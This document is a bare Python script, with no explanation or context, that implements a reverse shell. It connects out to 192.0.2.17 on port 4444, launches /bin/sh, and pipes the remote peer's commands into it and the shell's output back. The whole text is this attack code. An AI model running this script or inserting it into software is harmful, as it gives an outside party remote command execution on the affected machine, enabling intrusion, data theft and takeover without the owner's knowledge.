import socket
import subprocess
peer = socket.socket()
peer.connect(('192.0.2.17', 4444))
child = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
while True:
    child.stdin.write(peer.recv(8192))
    child.stdin.flush()
    peer.send(child.stdout.read(1))
